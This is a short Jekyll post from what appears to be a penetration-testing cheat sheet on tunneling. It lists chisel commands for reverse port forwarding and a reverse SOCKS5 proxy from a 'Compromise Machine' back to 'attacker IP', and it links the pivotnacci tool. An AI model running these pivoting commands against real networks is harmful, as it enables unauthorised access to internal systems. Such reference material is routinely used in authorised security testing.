---
layout: post
title: "Tunneling"
os: ["Windows", "Linux"]
tags: ["Port Forwarding", "SOCKS", "Tunneling"]
code:
  - title: Port Forwarding
    description: Start chisel on atack machine
    sample: ./chisel server --reverse -p "listen port"
  - title: 
    description: Start communication between Attach machine and Compromise Machine
    sample: ./chisel client "attacker IP":"attacker Port" R:"local port":"IP to expose":"Port to expose"
  - title: SOCKS
    description: Start chisel on atack machine
    sample: ./chisel server --socks5 --reverse [-p "PORT"]
  - title:
    description: Start communication between Attach machine and Compromise Machine
    sample: ./chisel client "attacker IP":"port" R:socks
    args: In the local machine, connect via SOCKS5 using the port provided by Chisel.
  - title: pivotnacci
    url: https://github.com/blackarrowsec/pivotnacci
---



<div class="window">
  <div class="title-bar">
      <div>
              <span class="window_dot language-bash"></span>
              <span class="window_dot bg-warning"></span>
              <span class="window_dot bg-success"></span>
      </div>
  </div>
  
  <div class="content">

  </div>
</div> 

> 

### pivotnacci

Source [here]()
